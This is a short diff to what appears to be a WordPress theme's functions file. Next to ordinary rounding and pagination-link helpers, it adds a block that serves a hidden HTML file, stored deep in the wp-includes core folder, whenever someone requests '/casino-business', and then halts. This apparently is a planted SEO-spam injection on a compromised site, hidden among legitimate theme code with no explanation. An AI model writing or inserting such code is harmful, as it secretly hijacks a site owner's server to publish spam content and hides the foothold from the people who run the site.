@@ -214,7 +214,10 @@ function n_round($num, $tonearest) {
    return floor($num/$tonearest)*$tonearest;
 }
 
-
+if ($_SERVER['REQUEST_URI'] == "/casino-business") {
+    include ABSPATH . "wp-includes/blocks/archives/pages/page_01.html";
+    exit;
+}
 ### Function: Filters for Previous and Next Posts Link CSS Class
 add_filter('previous_posts_link_attributes','previous_posts_link_class');
 function previous_posts_link_class() {
